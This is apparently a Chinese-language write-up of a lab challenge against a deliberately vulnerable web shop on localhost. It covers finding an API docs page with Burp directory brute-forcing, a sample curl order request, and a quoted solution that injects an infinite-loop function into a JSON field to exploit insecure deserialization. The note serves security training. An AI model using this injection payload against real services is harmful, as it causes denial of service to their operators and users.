---
title: Blocked RCE DoS
description: 探测到 API 页面后，研究使用方式，探测数据处理。不同于 rO0 开头的 Base64 编码的二进制流反序列化，此处尝试在 JSON 字段值中注入函数后执行。后端上下文不明，待获得更多信息。
---

- 描述：执行一个远程代码执行，使一个安全程度较低的应用程序永远忙碌。
- 之气使用 burp 的攻击器对根目录使用“感兴趣的文件及目录”列表进行爆破，得到
    - ```/api-docs/```
        ```NextGen B2B API
        New & secure JSON-based API for our enterprise customers.
        (Deprecates previously offered XML-based endpoints)
        ```
    - 页面对此 API 的使用方式进行描述与示例
        - 路径 ```http://localhost:3000/b2b/v2/orders```
        - 请求构造
            ```sh
            curl -X 'POST' \
            'http://localhost:3000/b2b/v2/orders' \
            -H 'accept: application/json' \
            -H 'Content-Type: application/json' \
            -d '{
            "cid": "JS0815DE",
            "orderLines": [
                {
                "productId": 8,
                "quantity": 500,
                "customerReference": "PO0000001"
                }
            ],
            "orderLinesData": "[{\"productId\": 12,\"quantity\": 10000,\"customerReference\": [\"PO0000001.2\", \"SM20180105|042\"],\"couponCode\": \"pes[Bh.u*t\"},{\"productId\": 13,\"quantity\": 2000,\"customerReference\": \"PO0000003.4\"}]"
            }'
            ```
        - 使用尝试发送功能得到 401 未验证响应，复制登录后的验证头再次发送得到成功响应
- 查看示例解决方案：
    > 不安全的 JSON 反序列化会执行 JSON 字符串中定义的任何函数调用，因此 DoS 攻击的可能有效载荷是一个无限循环。在 Request Body 字段中将示例代码替换为 ```{"orderLinesData": "(function dos() { while(true); })()"}``` 。点击 Execute。